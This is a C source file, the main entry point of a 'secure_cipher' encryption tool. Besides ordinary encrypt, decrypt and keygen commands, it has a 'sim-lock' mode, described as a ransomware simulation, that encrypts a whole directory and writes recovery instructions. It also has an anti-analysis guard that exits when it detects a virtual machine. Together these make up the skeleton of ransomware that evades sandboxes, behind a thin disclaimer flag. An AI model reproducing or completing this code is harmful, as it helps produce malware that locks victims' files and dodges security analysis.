#include "secure_cipher/anti_analysis/audit.h"
#include "secure_cipher/anti_analysis/vm_guard.h"
#include "secure_cipher/cli/parser.h"
#include "secure_cipher/config.h"
#include "secure_cipher/context.h"
#include "secure_cipher/crypto/decrypt.h"
#include "secure_cipher/crypto/encrypt.h"
#include "secure_cipher/crypto/keystore.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sodium.h>
#include <stdio.h>
#include <sys/stat.h>

static int run_encrypt_command(const AppContext *ctx, const char *path) {
    struct stat st;

    if (stat(path, &st) != 0) {
        fprintf(stderr, "Could not access '%s': %s\n", path, strerror(errno));
        return 1;
    }

    if (S_ISDIR(st.st_mode)) {
        return encrypt_directory(ctx, path) ? 0 : 1;
    }

    if (!S_ISREG(st.st_mode)) {
        fprintf(stderr, "'%s' is not a regular file or directory.\n", path);
        return 1;
    }

    return encrypt_file(ctx, path, 1) ? 0 : 1;
}

static int run_decrypt_command(const AppContext *ctx, const char *path) {
    struct stat st;

    if (stat(path, &st) != 0) {
        fprintf(stderr, "Could not access '%s': %s\n", path, strerror(errno));
        return 1;
    }

    if (S_ISDIR(st.st_mode)) {
        return decrypt_directory(ctx, path) ? 0 : 1;
    }

    if (!S_ISREG(st.st_mode)) {
        fprintf(stderr, "'%s' is not a regular file or directory.\n", path);
        return 1;
    }

    return decrypt_file(ctx, path, 1) ? 0 : 1;
}

int main(int argc, char *argv[]) {
    AppContext ctx;
    CliOptions options;
    int exit_code = 1;

    app_context_init(&ctx, argv[0]);

    if (sodium_init() < 0) {
        fprintf(stderr, "libsodium initialization failed.\n");
        app_context_clear(&ctx);
        return 1;
    }

    if (!cli_parse(argc, argv, &ctx, &options)) {
        cli_print_usage(argv[0]);
        app_context_clear(&ctx);
        return 1;
    }

    app_context_resolve_threads(&ctx);

    if (!options.audit_env && getenv(VM_ALLOW_ENV) == NULL) {
        vm_guard_exit_if_detected();
    }

    if (options.audit_env) {
        audit_print_environment_report();
    }

    switch (options.command) {
    case CLI_CMD_KEYGEN:
        exit_code = keystore_init_keydir(options.path) ? 0 : 1;
        goto done;

    case CLI_CMD_ENCRYPT:
    case CLI_CMD_ENCRYPT_DIR:
    case CLI_CMD_DECRYPT:
    case CLI_CMD_SIM_LOCK:
        if (!keystore_load_passphrase(&ctx, options.keydir)) {
            goto done;
        }
        break;

    default:
        cli_print_usage(argv[0]);
        goto done;
    }

    switch (options.command) {
    case CLI_CMD_ENCRYPT:
        exit_code = run_encrypt_command(&ctx, options.path);
        break;

    case CLI_CMD_ENCRYPT_DIR:
        exit_code = encrypt_directory(&ctx, options.path) ? 0 : 1;
        break;

    case CLI_CMD_DECRYPT:
        exit_code = run_decrypt_command(&ctx, options.path);
        break;

    case CLI_CMD_SIM_LOCK:
        if (!ctx.disclaimer_accepted) {
            fprintf(
                stderr,
                "ERROR: sim-lock requires --disclaimer for authorized simulation use.\n"
                "Example: ./secure_cipher -k <keydir> --disclaimer sim-lock <directory>\n"
            );
            break;
        }

        {
            struct stat st;
            if (stat(options.path, &st) != 0) {
                fprintf(stderr, "Could not access '%s': %s\n", options.path, strerror(errno));
                break;
            }

            if (!S_ISDIR(st.st_mode)) {
                fprintf(stderr, "sim-lock requires a directory path.\n");
                break;
            }

            printf("Starting ransomware simulation on directory: %s\n", options.path);
            if (encrypt_directory(&ctx, options.path)) {
                write_recovery_instructions(options.path, options.keydir);
                exit_code = 0;
            }
        }
        break;

    default:
        break;
    }

done:
    app_context_clear(&ctx);
    return exit_code;
}
